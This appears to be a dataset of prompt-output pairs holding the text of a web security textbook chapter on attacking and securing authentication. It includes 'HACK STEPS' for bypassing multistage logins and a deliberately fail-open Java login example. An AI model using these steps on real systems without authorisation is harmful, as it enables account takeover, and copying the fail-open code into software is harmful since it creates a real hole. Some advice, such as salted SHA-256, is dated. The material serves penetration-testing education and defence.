determined, try to predict the activation URLs sent to\nrecent and forthcoming users, and attempt to use these URLs to take\nownership of their accounts.\n■ Try to reuse a single reactivation URL multiple times, and see if the appli-\ncation allows this. If not, try locking out the target account before reusing\nthe URL, and see if it now works."
  },
  {
    "input": "Implementation Flaws in Authentication",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 156\n156 Chapter 6 ■ Attacking Authentication\nImplementation Flaws in Authentication\nEven a well-designed authentication mechanism may be highly insecure due\nto mistakes made in its implementation. These mistakes may lead to informa-\ntion leakage, complete login bypassing, or a weakening of the overall security\nof the mechanism as designed. Implementation flaws tend to be more subtle\nand harder to detect than design defects such as poor quality passwords and\nbrute forcibility. For this reason, they are often a fruitful target for attacks\nagainst the most security-critical applications, where numerous threat models\nand penetration tests are likely to have claimed any low-hanging fruit. The\nauthors have identified each of the implementation flaws described here\nwithin the web applications deployed by large banks.\nFail-Open Login Mechanisms\nFail-open logic is a species of logic flaw (described in detail in Chapter 11) and\none that has particularly serious consequences in the context of authentication\nmechanisms.\nThe following is a fairly contrived example of a login mechanism that fails\nopen. If the call to db.getUser() throws an exception for some reason (for\nexample, a null pointer exception arising because the user’s request did not\ncontain a username or password parameter), then the login will be successful.\nAlthough the resulting session may not be bound to a particular user identity,\nand so may not be fully functional, this may still enable an attacker to access\nsome sensitive data or functionality.\npublic Response checkLogin(Session session) {\ntry {\nString uname = session.getParameter(“username”);\nString passwd = session.getParameter(“password”);\nUser user = db.getUser(uname, passwd);\nif (user == null) {\n// invalid credentials\nsession.setMessage(“Login failed.”);\nreturn doLogin(session);\n}\n}\ncatch (Exception e) {}\n// valid user\nsession.setMessage(“Login successful.”);\nreturn doMainMenu(session);\n}\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 157\nChapter 6 ■ Attacking Authentication 157\nIn the field, one would not expect code like this to pass even the most cur-\nsory security review. However, the same conceptual flaw is much more likely\nto exist in more complex mechanisms in which numerous layered method\ninvocations are made, in which many potential errors may arise and be han-\ndled in different places, and where the more complicated validation logic may\ninvolve maintaining significant state about the progress of the login.\nHACK STEPS\n■ Perform a complete, valid login using an account you control. Record\nevery piece of data submitted to the application, and every response\nreceived, using your intercepting proxy.\n■ Repeat the login process numerous times, modifying pieces of the data\nsubmitted in unexpected ways. For example, for each request parameter\nor cookie sent by the client:\n■ Submit an empty string as the value.\n■ Remove the name/value pair altogether.\n■ Submit very long and very short values.\n■ Submit strings instead of numbers and vice versa.\n■ Submit the same item multiple times, with the same and different values.\n■ For each malformed request submitted, review closely the application’s\nresponse to identify any divergences from the base case.\n■ Feed these observations back into framing your test cases. When one\nmodification causes a change in behavior, try to combine this with other\nchanges to push the application’s logic to its limits.\nDefects in Multistage Login Mechanisms\nSome applications use elaborate login mechanisms involving multiple stages.\nFor example:\n■■ Entry of a username and password.\n■■ A challenge for specific digits from a PIN or a memorable word.\n■■ The submission of a value displayed on a changing physical token.\nMultistage login mechanisms are designed to provide enhanced security\nover the simple model based on username and password. Typically, the first\nstage requires the user to identify themselves with a username or similar item,\nand subsequent stages perform various authentication checks. Such mecha-\nnisms frequently contain security vulnerabilities, and in particular various\nlogic flaws (see Chapter 11).\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 158\n158 Chapter 6 ■ Attacking Authentication\nCOMMON MYTH It is often assumed that multistage login mechanisms\nare less prone to security bypasses than standard username/password\nauthentication. This belief is misleading. Performing several authentication\nchecks may add considerable security to the mechanism. Counterbalancing this,\nthe process is more prone to flaws in implementation. In several cases where a\ncombination of flaws is present, it can even result in a solution that is less\nsecure than a normal login based on username and password.\nSome implementations of multistage login mechanisms make potentially\nunsafe assumptions at each stage about the user’s interaction with earlier\nstages. For example:\n■■ An application may assume that a user who accesses stage three must\nhave cleared stages one and two. Therefore, it may authenticate an\nattacker who proceeds directly from stage one to stage three and cor-\nrectly completes it, enabling an attacker to log in with only one part of\nthe various credentials normally required.\n■■ An application may trust some of the data being processed at stage two\nbecause this was validated at stage one. However, an attacker may be\nable to manipulate this data at stage two, giving it a different value than\nwas validated at stage one. For example, at stage one the application\nmight determine whether the user’s account has expired, is locked out,\nor is in the administrative group, or whether it needs to complete fur-\nther stages of the login beyond stage two. If an attacker can interfere\nwith these flags as the login transitions between different stages, they\nmay be able to modify the behavior of the application and cause it to\nauthenticate them with only partial credentials or otherwise elevate\nprivileges.\n■■ An application may assume that the same user identity is used to com-\nplete each stage; however, it might not explicitly check this. For exam-\nple, stage one might involve submitting a valid username and\npassword, and stage two might involve resubmitting the username\n(now in a hidden form field) and a value from a changing physical\ntoken. If an attacker submits valid data pairs at each stage, but for dif-\nferent users, then the application might authenticate the user as either\none of the identities used in the two stages. This would enable an\nattacker who possesses his own physical token and discovers another\nuser’s password to log in as that user (or vice versa). Although the\nlogin mechanism cannot be completely compromised without any prior\ninformation, its overall security posture is substantially weakened and\nthe substantial expense and effort of implementing the two-factor\nmechanism does not deliver the benefits expected.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 159\nChapter 6 ■ Attacking Authentication 159\nHACK STEPS\n■ Perform a complete, valid login using an account you control. Record\nevery piece of data submitted to the application using your intercepting\nproxy.\n■ Identify each distinct stage of the login and the data that is collected at\neach stage. Determine whether any single piece of information is col-\nlected more than once or is ever transmitted back to the client and\nresubmitted, via a hidden form field, cookie, or preset URL parameter\n(see Chapter 5).\n■ Repeat the login process numerous times with various malformed\nrequests:\n■ Try performing the login steps in a different sequence.\n■ Try proceeding directly to any given stage and continuing from there.\n■ Try skipping each stage and continuing with the next.\n■ Use your imagination to think of further ways of accessing the differ-\nent stages that the developers may not have anticipated.\n■ If any data is submitted more than once, try submitting a different value\nat different stages, and see whether the login is still successful. It may\nbe that some of the submissions are superfluous and are not actually\nprocessed by the application. It might be that the data is validated at one\nstage and then trusted subsequently—in this instance, try to provide the\ncredentials of one user at one stage, and then switch at the next to actu-\nally authenticate as a different user. It might be that the same piece of\ndata is validated at more than one stage, but against different checks—\nin this instance, try to provide (for example) the username and password\nof one user at the first stage, and the username and PIN number of a dif-\nferent user at the second stage.\n■ Pay close attention to any data being transmitted via the client that was\nnot directly entered by the user. This may be used by the application to\nstore information about the state of the login progress, and may be\ntrusted by the application. For example, if the request for stage three\nincludes the parameter “stage2complete=true” then it may be possible\nto advance straight to stage three by setting this value. Try to modify the\nvalues being submitted and determine whether this enables you to\nadvance or skip stages.\nSome login mechanisms employ a randomly varying question at one of the\nstages of the login process. For example, after submitting a username and\npassword, the user might be asked one of various “secret” questions (regard-\ning their mother’s maiden name, place of birth, name of first school, etc.) or to\nsubmit two random letters from a secret phrase. The rationale for this behav-\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 160\n160 Chapter 6 ■ Attacking Authentication\nior is that even if an attacker captures everything that a user enters on a single\noccasion, this will not enable them to log in as that user on a different occasion,\nbecause different questions will be asked.\nIn some implementations, this functionality is broken and does not achieve\nits objectives:\n■■ The application may present a randomly chosen question, and store\nthe details of the question within a hidden HTML form field or cookie,\nrather than on the server. The user subsequently submits both the\nanswer and the question itself. This effectively allows an attacker to\nchoose which question to answer, enabling the attacker to repeat a\nlogin after capturing a user’s input on a single occasion.\n■■ The application may present a randomly chosen question on each login\nattempt but not remember which question a given user was asked in the\nevent that he or she fails to submit an answer. If the same user initiates a\nfresh login attempt a moment later, a different random question will be\ngenerated. This effectively allows an attacker to cycle through questions\nuntil they receive one to which they know the answer, enabling them to\nrepeat a login having captured a user’s input on a single occasion.\nNOTE The second of these conditions is really quite subtle, and as a result,\nmany real-world applications are vulnerable. An application that challenges a\nuser for two random letters of a memorable word may appear at first glance to\nbe functioning properly and providing enhanced security. However, if the letters\nare randomly chosen each time the previous authentication stage is passed,\nthen an attacker who has captured a user’s login on a single occasion can\nsimply reauthenticate up to this point until the two letters that he knows are\nrequested, without the risk of account lockout.\nHACK STEPS\n■ If one of the login stages uses a randomly varying question, verify\nwhether the details of the question are being submitted together with\nthe answer. If so, change the question, and submit the correct answer\nassociated with that question, and verify whether the login is still\nsuccessful.\n■ If the application does not enable an attacker to submit an arbitrary\nquestion and answer, perform a partial login several times with a single\naccount, proceeding each time as far as the varying question. If the ques-\ntion changes on each occasion, then an attacker can still effectively\nchoose which question to answer.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 161\nChapter 6 ■ Attacking Authentication 161\nNOTE In some applications where one component of the login varies\nrandomly, the application collects all of a user’s credentials at a single stage.\nFor example, the main login page may present a form containing fields for\nusername, password, and one of various secret questions. Each time the login\npage is loaded, the secret question changes. In this situation, the randomness\nof the secret question does nothing to prevent an attacker from replaying a\nvalid login request having captured a user’s input on one occasion, and the\nlogin process cannot be modified to do so in its present form, because an\nattacker can simply reload the page until he receives the varying question to\nwhich he knows the answer. In a variation on this scenario, the application may\nset a persistent cookie to “ensure” that the same varying question is presented\nto any given user until that person answers it correctly. This measure can of\ncourse be trivially circumvented by modifying or deleting the cookie.\nInsecure Storage of Credentials\nIf an application stores login credentials in an insecure manner, then the secu-\nrity of the login mechanism is undermined, even though there may be no\ninherent flaw in the authentication process itself.\nIt is very common to encounter web applications in which user credentials\nare stored in unencrypted form within the database. Because the database\naccount used by the application must have full read/write access to those cre-\ndentials, many kinds of other vulnerabilities within the application may be\nexploitable to enable you to access these credentials—for example, command\nor SQL injection flaws (Chapter 9) or access control weaknesses (Chapter 8).\nHACK STEPS\n■ Review the entire authentication-related functionality of the application,\nand also any functions relating to user maintenance. If any instances are\nfound in which a user’s password is transmitted back to the client, then\nthis may indicate that passwords are being stored in an insecure manner.\n■ If any kind of arbitrary command or query execution vulnerability is\nidentified within the application, attempt to find the location within the\napplication’s database or file system where user credentials are stored.\nQuery these to determine whether passwords are being stored in unen-\ncrypted form."
  },
  {
    "input": "Securing Authentication",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 162\n162 Chapter 6 ■ Attacking Authentication\nSecuring Authentication\nImplementing a secure authentication solution involves attempting to simul-\ntaneously meet several key security objectives, and in many cases trade off\nagainst other objectives such as functionality, usability, and total cost. In some\ncases “more” security can actually be counterproductive—for example, forc-\ning users to set very long passwords and change them frequently will often\nlead users to write their passwords down.\nBecause of the enormous variety of possible authentication vulnerabilities,\nand the potentially complex defenses that an application may need to deploy\nin order to mitigate against all of them, many application designers and devel-\nopers choose to accept certain threats as a given and concentrate their efforts\non preventing the most serious attacks. Factors to consider in striking an\nappropriate balance include:\n■■ The criticality of security given the functionality offered by the applica-\ntion.\n■■ The degree to which users will tolerate and work with different types of\nauthentication controls.\n■■ The cost of supporting a less user-friendly system.\n■■ The financial cost of competing alternatives in relation to the revenue\nlikely to be generated by the application or the value of the assets it is\nprotecting.\nIn this section we will describe the most effective ways possible to defeat the\nvarious attacks against authentication mechanisms and leave readers to\ndecide which kinds of defenses are most appropriate for them in individual\ncases.\nUse Strong Credentials\n■■ Suitable minimum password quality requirements should be enforced.\nThese may include rules regarding: minimum length; the appearance of\nalphabetical, numeric, and typographical characters; the appearance of\nboth uppercase and lowercase characters; the avoidance of dictionary\nwords, names, and other common passwords; the prevention of a pass-\nword being set to the username; and the prevention of a similarity or\nmatch with previously set passwords. As with most security measures,\ndifferent password quality requirements may be appropriate for differ-\nent categories of user.\n■■ Usernames should be unique.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 163\nChapter 6 ■ Attacking Authentication 163\n■■ Any system-generated usernames and passwords should be created\nwith sufficient entropy that they cannot feasibly be sequenced or pre-\ndicted even by an attacker who gains access to a large sample of succes-\nsively generated instances.\n■■ Users should be permitted to set sufficiently strong passwords—for\nexample, long passwords should be allowed, and a wide range of char-\nacters should be allowed.\nHandle Credentials Secretively\n■■ All credentials should be created, stored, and transmitted in a manner\nthat does not lead to unauthorized disclosure.\n■■ All client-server communications should be protected using a well-\nestablished cryptographic technology, such as SSL. Custom solutions\nfor protecting data in transit are neither necessary nor desirable.\n■■ If it is considered preferable to use HTTP for the unauthenticated areas\nof the application, ensure that the login form itself is loaded using\nHTTPS, rather than switching to HTTPS at the point of the login\nsubmission.\n■■ Only POSTrequests should be used for transmitting credentials to the\nserver. Credentials should never be placed in URL parameters or cook-\nies (even ephemeral ones). Credentials should never be transmitted\nback to the client, even in parameters to a redirect.\n■■ All server-side application components should store credentials in a\nmanner that does not allow their original values to be easily recovered\neven by an attacker who gains full access to all the relevant data within\nthe application’s database. The usual means of achieving this objective\nis to use a strong hash function (such as SHA-256, at the time of this\nwriting), appropriately salted to reduce the effectiveness of precom-\nputed offline attacks.\n■■ Client-side “remember me” functionality should in general only\nremember nonsecret items such as usernames. In less security-critical\napplications, it may be considered appropriate to allow users to opt\nin to a facility to remember passwords. In this situation, no clear-text\ncredentials should be stored on the client (the password should be\nstored reversibly encrypted using a key known only to the server), and\nusers should be warned about the risks from an attacker with physical\naccess to their computer or who compromises their computer remotely.\nParticular attention should be paid to eliminating cross-site scripting\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 164\n164 Chapter 6 ■ Attacking Authentication\nvulnerabilities within the application that may be used to steal stored\ncredentials (see Chapter 12).\n■■ A password change facility should be implemented (see the “Prevent\nMisuse of the Password Change Function” section), and users should\nbe obliged to change their password periodically.\n■■ Where credentials for new accounts are distributed to users out-of-\nband, these should be sent as securely as possible, be time-limited, and\nrequire the user to change them on first login, and the user should be\ntold to destroy the communication after first use.\n■■ Where applicable, consider capturing some of the user’s login informa-\ntion (for example, single letters from a memorable word) using drop-\ndown menus rather than text fields. This will prevent any keyloggers\ninstalled on the user’s computer from capturing all of the data they\nsubmit. (Note, however, that a simple keylogger is only one means by\nwhich an attacker can capture user input. If he or she has already com-\npromised a user’s computer, then in principle an attacker can log every\ntype of event, including mouse movements, form submissions over\nHTTPS, and screen captures.)\nValidate Credentials Properly\n■■ Passwords should be validated in full—that is, in a case-sensitive way,\nwithout filtering or modifying any characters, and without truncating\nthe password.\n■■ The application should be aggressive in defending itself against unex-\npected events occurring during login processing. For example, depend-\ning on the development language in use, the application should use\ncatch-all exception handlers around all API calls. These should explic-\nitly delete all session and method-local data being used to control the\nstate of the login processing and should explicitly invalidate the current\nsession, thereby causing a forced logout by the server even if authenti-\ncation is somehow bypassed.\n■■ All authentication logic should be closely code-reviewed, both as\npseudo-code and as actual application source code, to identify logic\nerrors such as fail-open conditions.\n■■ If functionality to support user impersonation is implemented, this\nshould be strictly controlled to ensure that it cannot be misused to\ngain unauthorized access. Because of the criticality of the functionality,\nit is often worthwhile to remove this functionality entirely from the\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 165\nChapter 6 ■ Attacking Authentication 165\npublic-facing application, and implement it only for internal adminis-\ntrative users, whose use of impersonation should be tightly controlled\nand audited.\n■■ Multistage logins should be strictly controlled to prevent an attacker\nfrom interfering with the transitions and relationships between the\nstages:\n■■ All data about progress through the stages and the results of previ-\nous validation tasks should be held in the server-side session object\nand should never be transmitted to or read from the client.\n■■ No items of information should be submitted more than once by the\nuser, and there should be no means for the user to modify data that\nhas already been collected and/or validated. Where an item of data\nsuch as a username is used at multiple stages, this should be stored\nin a session variable when first collected, and referenced from there\nsubsequently.\n■■ The first task carried out at every stage should be to verify that all\nprior stages have been correctly completed. If this is not the case, the\nauthentication attempt should immediately be marked as bad.\n■■ To prevent information leakage about which stage of the login failed\n(which would enable an attacker to target each stage in turn), the\napplication should always proceed through all stages of the login,\neven if the user has failed to complete earlier stages correctly, and\neven if the original username was invalid. After proceeding through\nall of the stages, the application should present a generic “login\nfailed” message at the conclusion of the final stage, without provid-\ning any information about where the failure occurred.\n■■ Where a login process includes a randomly varying question, ensure\nthat an attacker is not able to effectively choose his own question:\n■■ Always employ a multistage process in which users identify them-\nselves at an initial stage, and the randomly varying question is pre-\nsented to them at a later stage.\n■■ When a given user has been presented with a given varying ques-\ntion, store that question within their persistent user profile, and\nensure that the same user is presented with the same question on\neach attempted login until they successfully answer it.\n■■ When a randomly varying challenge is presented to the user, store\nthe question that has been asked within a server-side session vari-\nable, rather than a hidden field in an HTML form, and validate the\nsubsequent answer against that saved question.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 166\n166 Chapter 6 ■ Attacking Authentication\nNOTE The subtleties of devising a secure authentication mechanism run\ndeep here. If care is not taken in the asking of a randomly varying question,\nthen this can lead to new opportunities for username enumeration. For\nexample, in order to prevent an attacker from choosing his own question, an\napplication may store within each user’s profile the last question that user was\nasked, and continue presenting that question until the user answers it correctly.\nAn attacker who initiates several logins using any given user’s username will\nbe met with the same question. However, if the attacker carries out the same\nprocess using an invalid username, the application may behave differently:\nbecause there is no user profile associated with an invalid username, there\nwill be no stored question, and so a varying question will be presented. The\nattacker can use this difference in behavior, manifested across several login\nattempts, to infer the validity of a given username. In a scripted attack, he will\nbe able to harvest numerous usernames quickly.\nIf an application wishes to defend itself against this possibility, it must go to\nsome lengths. When a login attempt is initiated with an invalid username, the\napplication must record somewhere the random question that it presented for\nthat invalid username and ensure that subsequent login attempts using the\nsame username are met with the same question. Going even further, the\napplication could switch to a different question periodically, to simulate the\nnonexistent user having logged in as normal, resulting in a change in their next\nquestion! At some point, however, the application designer must draw a line\nand concede that a total victory against an attacker as determined as this is\nprobably not achievable.\nPrevent Information Leakage\n■■ The various authentication mechanisms used by the application should\nnot disclose any information about authentication parameters, either\nthrough overt messages or through inference from other aspects of the\napplication’s behavior. An attacker should have no means of determin-\ning which piece of the various items submitted has caused a problem.\n■■ A single code component should be responsible for responding to all\nfailed login attempts, with a generic message. This avoids a subtle vul-\nnerability that can occur when a supposedly uninformative message\nreturned from different code paths can actually be discriminated by an\nattacker, due to typographical differences in the message, different\nHTTP status codes, other information hidden in HTML, and the like.\n■■ If the application enforces some kind of account lockout to prevent\nbrute-force attacks (as discussed in the next section), then care should\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 167\nChapter 6 ■ Attacking Authentication 167\nbe taken that this does not lead to any information leakage. For exam-\nple, if an application discloses that a specific account has been sus-\npended for X minutes due to Y failed logins, then this behavior can\neasily be used to enumerate valid usernames. In addition, disclosing\nthe precise metrics of the lockout policy enables an attacker to optimize\nany attempt to continue guessing passwords in spite of the policy. To\navoid enumeration of usernames, the application should respond to any\nseries of failed login attempts from the same browser with a generic\nmessage advising that accounts are suspended if multiple failures occur\nand that the user should try again later. This can be achieved using a\ncookie or hidden field to track repeated failures originating from the\nsame browser. (Of course, this mechanism should not be used to\nenforce any actual security control—only to provide a helpful message\nto ordinary users who are struggling to remember their credentials.)\n■■ If the application supports self-registration, then it can prevent this func-\ntion from being used to enumerate existing usernames in two ways:\n■■ Instead of permitting self-selection of usernames, the application can\ncreate a unique (and unpredictable) username for each new user,\nthereby obviating the need to disclose that a username selected\nalready exists.\n■■ The application can use email addresses as usernames. Here, the\nfirst stage of the registration process requires the user to enter their\nemail address, whereupon they are told simply to wait for an email\nand follow the instructions contained within it. If the email address\nis already registered, the user can be informed of this in the email. If\nthe address is not already registered, the user can be provided with\na unique, unguessable URL to visit to continue the registration\nprocess. This prevents the attacker from enumerating valid user-\nnames (unless they happen to have already compromised a large\nnumber of email accounts).\nPrevent Brute-Force Attacks\n■■ Measures need to be enforced within all of the various challenges\nimplemented by the authentication functionality in order to prevent\nattacks that attempt to meet those challenges using automation. This\nincludes the login itself, as well as functions to change password, to\nrecover from a forgotten password situation, and the like.\n■■ Using unpredictable usernames and preventing their enumeration pre-\nsents a significant obstacle to completely blind brute-force attacks, and\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 168\n168 Chapter 6 ■ Attacking Authentication\nrequires an attacker to have somehow discovered one or more specific\nusernames before mounting an attack.\n■■ Some security-critical applications (such as online banks) simply\ndisable an account after a small number of failed logins (e.g., three)\nand require that the account owner take various out-of-band steps to\nreactivate the account, such as telephoning customer support and\nanswering a series of security questions. Disadvantages of this policy\nare that it allows an attacker to deny service to legitimate users by\nrepeatedly disabling their accounts, and the cost of providing the\naccount recovery service. A more balanced policy, suitable for most\nsecurity-aware applications, is to suspend accounts for a short period\n(e.g., 30 minutes) following a small number of failed login attempts\n(e.g., three). This serves to massively slow down any password-\nguessing attack, while mitigating the risk of denial-of-service attacks\nand also reducing call center work.\n■■ If a policy of temporary account suspension is implemented, care\nshould be taken to ensure its effectiveness:\n■■ To prevent information leakage leading to username enumeration,\nthe application should never indicate that any specific account has\nbeen suspended. Rather, it should respond to any series of failed\nlogins, even those using an invalid username, with a message advis-\ning that accounts are suspended if multiple failures occur and that\nthe user should try again later (as discussed previously).\n■■ The metrics of the policy should not be disclosed to users. Telling\nlegitimate users simply to “try again later” does not seriously dimin-\nish their quality of service. But informing an attacker exactly how\nmany failed attempts are tolerated, and how long the suspension\nperiod is for, enables them to optimize any attempt to continue\nguessing passwords in spite of the policy.\n■■ If an account is suspended, then login attempts should be rejected\nwithout even checking the credentials. Some applications that have\nimplemented a suspension policy remain vulnerable to brute forcing\nbecause they continue to fully process login attempts during the sus-\npension period, and return a subtly (or not so subtly) different mes-\nsage when valid credentials are submitted. This behavior enables an\neffective brute-force attack to proceed at full speed regardless of the\nsuspension policy.\n■■ Per-account countermeasures such as account lockout do not help to\nprotect against one kind of brute-force attack that is often highly effec-\ntive—namely to iterate through a long list of enumerated usernames\nchecking a single weak password, such as password. If, for example, five\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 169\nChapter 6 ■ Attacking Authentication 169\nfailed attempts trigger an account suspension, this means an attacker\ncan attempt four different passwords on every account without causing\nany disruption to users. In a typical application containing many weak\npasswords, such an attacker is likely to compromise many accounts.\nThe effectiveness of this kind of attack will, of course, be massively\nreduced if other areas of the authentication mechanism are designed\nsecurely. If usernames cannot be enumerated or reliably predicted, an\nattacker will be slowed down by the need to perform a brute-force exer-\ncise in guessing usernames. And if strong requirements are in place for\npassword quality, it is far less likely that the attacker will choose a pass-\nword for testing that even a single user of the application has chosen.\nIn addition to these controls, an application can specifically protect\nitself against this kind of attack through the use of CAPTCHA (“Com-\npletely Automated Public Turing test to tell Computers and Humans\nApart”) challenges on every page that may be a target for brute-force\nattacks (see Figure6-8). If effective, this measure can prevent any auto-\nmated submission of data to any application page, thereby restricting\nall kinds of password-guessing attacks from being executed manually.\nNote that much research has been done into CAPTCHA technologies,\nand automated attacks against them have in some cases been reliable.\nFurther, some attackers have been known to devise CAPTCHA-solving\ncompetitions, in which unwitting members of the public are leveraged\nas drones to assist the attacker. However, even if a particular kind of\nchallenge is not entirely effective, it will still lead most casual attackers\nto desist and find an application that does not employ the technique.\nFigure 6-8: A CAPTCHA control\ndesigned to hinder automated attacks\nTIP If you are attacking an application that uses CAPTCHA controls to hinder\nautomation, always closely review the HTML source for the page in which the\nimage appears. The authors have encountered cases where the solution to the\npuzzle appears in literal form within the ALTattribute of the image tag, or\nwithin a hidden form field, enabling a scripted attack to defeat the protection\nwithout actually solving the puzzle itself.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 170\n170 Chapter 6 ■ Attacking Authentication\nPrevent Misuse of the Password Change Function\n■■ A password change function should always be implemented, to allow\nperiodic password expiration (if required) and to allow users to change\npasswords if they wish to for any reason. As a key security mechanism,\nthis needs to be very well defended against misuse.\n■■ The function should only be accessible from within an authenticated\nsession.\n■■ There should be no facility to provide a username, either explicitly or\nvia a hidden form field or cookie—users have no legitimate need to\nattempt to change other people’s passwords.\n■■ As a defense-in-depth measure, the function should be protected from\nunauthorized access gained via some other security defect in the appli-\ncation—such as a session hijacking vulnerability, cross-site scripting,\nor even an unattended terminal. To this end, users should be required\nto reenter their existing password.\n■■ The new password should be entered twice to prevent mistakes, and\nthe application should compare the “new password” and “confirm new\npassword” fields as its first step and return an informative error if they\ndo not match.\n■■ The function should prevent the various attacks that can be made\nagainst the main login mechanism: a single generic error message\nshould be used to notify users of any error in existing credentials, and\nthe function should be temporarily suspended following a small num-\nber of failed attempts to change password.\n■■ Users should be notified out-of-band (e.g., via email) that their pass-\nword has been changed, but the message should not contain either their\nold or new credentials.\nPrevent Misuse of the Account Recovery Function\n■■ In the most security-critical applications, such as online banking,\naccount recovery in the event of a forgotten password is handled out-\nof-band: a user must make a telephone call and answer a series of secu-\nrity questions, and new credentials or a reactivation code are also sent\nout-of-band (via conventional mail) to the user’s registered home\naddress. The majority of applications do not want or need this level of\nsecurity, and so an automated recovery function may be appropriate.\n■■ A well-designed password recovery mechanism needs to prevent\naccounts from being compromised by an unauthorized party, and mini-\nmize any disruption to legitimate users.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 171\nChapter 6 ■ Attacking Authentication 171\n■■ Features such as password “hints” should absolutely never be used,\nsince they mainly serve to assist an attacker in trawling for accounts\nwith obvious hints set.\n■■ The best automated solution for enabling users to regain control of\naccounts is to email the user a unique, time-limited, unguessable,\nsingle-use recovery URL. This email should be sent to the address that\nthe user provided during registration. Visiting the URL will allow the\nuser to set a new password. After this has been done, a second email\nshould be sent, indicating that a password change was made. To pre-\nvent an attacker denying service to users by continually requesting\npassword reactivation emails, the user’s existing credentials should\nremain valid until such time as they are changed.\n■■ To further protect against unauthorized access, applications may pre-\nsent users with a secondary challenge that they must complete before\ngaining access to the password reset function. Care must taken to\nensure that the design of this challenge does not introduce new\nvulnerabilities:\n■■ The challenge should implement the same question or set of ques-\ntions for everyone, mandated by the application during registration.\nIf users provide their own challenge, it is likely that some of these\nwill be very weak, and this also enables an attacker to enumerate\nvalid accounts by identifying those which have a challenge set.\n■■ Responses to the challenge should contain sufficient entropy that\nthey cannot be easily guessed. For example, asking the user for the\nname of their first school is preferable to asking for their favorite\ncolor.\n■■ Accounts should be temporarily suspended following a number of\nfailed attempts to complete the challenge, to prevent brute-force\nattacks.\n■■ The application should not leak any information in the event of\nfailed responses to the challenge—regarding the validity of the\nusername, any suspension of the account, and so on.\n■■ Successful completion of the challenge should be followed by the\nprocess described previously, in which a message is sent to the\nuser’s registered email address containing a reactivation URL.\nUnder no circumstances should the application disclose the user’s\nforgotten password or simply drop the user into an authenticated\nsession. Even proceeding directly to the password reset function is\nundesirable, because the response to the account recovery challenge\nwill in general be easier for an attacker to guess than the original\npassword, and so it should not be relied upon on its own to authen-\nticate the user."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 172\n172 Chapter 6 ■ Attacking Authentication\nLog, Monitor, and Notify\n■■ All authentication-related events should be logged by the application,\nincluding login, logout, password change, password reset, account sus-\npension, and account recovery. Where applicable, both failed and suc-\ncessful attempts should be logged. The logs should contain all relevant\ndetails (e.g., username, and IP address) but no security secrets (e.g.,\npasswords). Logs should be strongly protected from unauthorized\naccess, as they are a critical source of information leakage.\n■■ Anomalies in authentication events should be processed by the applica-\ntion’s real-time alerting and intrusion prevention functionality. For\nexample, application administrators should be made aware of patterns\nindicating brute-force attacks, so that appropriate defensive and offen-\nsive measures can be considered.\n■■ Users should be notified out-of-band of any critical security events. For\nexample, the application should send a message to a user’s registered\nemail address whenever he changes hispassword.\n■■ Users should be notified in-band of frequently occurring security\nevents. For example, after a successful login, the application should\ninform users of the time and source IP/domain of the last login, and\nthe number of invalid login attempts made since then. If a user is\nmade aware that her account is being subjected to a password-\nguessing attack, she is more likely to change her password\nfrequently and set it to a strong value.\nChapter Summary\nAuthentication functions are perhaps the most prominent target in a typical\napplication’s attack surface. By definition, they can be reached by unprivi-\nleged, anonymous users. If broken, they grant access to protected functional-\nity and sensitive data. They lie at the core of the security mechanisms that an\napplication employs to defend itself, and are the front line of defense against\nunauthorized access.\nReal-world authentication mechanisms contain a myriad of design and\nimplementation flaws. An effective assault against them needs to proceed sys-\ntematically, using a structured methodology to work through every possible\navenue of attack. In many cases, open goals present themselves—bad pass-\nwords, ways to find out usernames, and vulnerability to brute-force attacks. At\nthe other end of the spectrum, defects may be very hard to uncover, and it may\nrequire meticulous examination of a convoluted login process to establish the"
  },
  {
    "input": "Questions",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 173\nChapter 6 ■ Attacking Authentication 173\nassumptions being made and spot the subtle logic flaw that can be exploited to\nwalk right through the door.\nThe most important lesson when attacking authentication functionality is to\nlook everywhere. In addition to the main login form, there may be functions to\nregister new accounts, change passwords, remember passwords, recover for-\ngotten passwords, and impersonate other users. Each of these presents a rich\ntarget of potential defects, and problems that have been consciously elimi-\nnated within one function very often reemerge within others. Invest the time\nto scrutinize and probe every inch of attack surface you can find, and your\nrewards may be great.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. While testing a web application you log in using your credentials of joe\nand pass. During the login process, you see a request for the following\nURL appear in your intercepting proxy:\nhttp://www.wahh-app.com/app?action=login&uname=\njoe&password=pass\nWhat three vulnerabilities can you diagnose without probing any\nfurther?\n2. How can self-registration functions introduce username enumeration\nvulnerabilities? How can these vulnerabilities be prevented?\n3. A login mechanism involves the following steps:\n(a) The application requests the user’s username and passcode.\n(b) The application requests two randomly chosen letters from the\nuser’s memorable word.\nWhy is the required information requested in two separate steps? What\ndefect would the mechanism contain if this were not the case?\n4. A multistage login mechanism first requests the user’s username and\nthen various other items across successive stages. If any supplied item\nis invalid, the user is immediately returned to the first stage.\nWhat is wrong with this mechanism, and how can the vulnerability be\ncorrected?\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 174\n174 Chapter 6 ■ Attacking Authentication\n5. An application incorporates an anti-phishing mechanism into its login\nfunctionality. During registration, each user selects a specific image\nfrom a large bank of memorable images presented to them by the appli-\ncation. The login function involves the following steps:\n(a) The user enters their username and date of birth.\n(b) If these details are correct, the application displays to the user their\nchosen image; otherwise, a random image is displayed.\n(c) The user verifies that the correct image is displayed, and if so, enters\ntheir password.\nThe idea behind the anti-phishing mechanism is that it enables the user\nto confirm that they are dealing with the authentic application, and not\na clone, because only the real application knows the correct image to\ndisplay to the 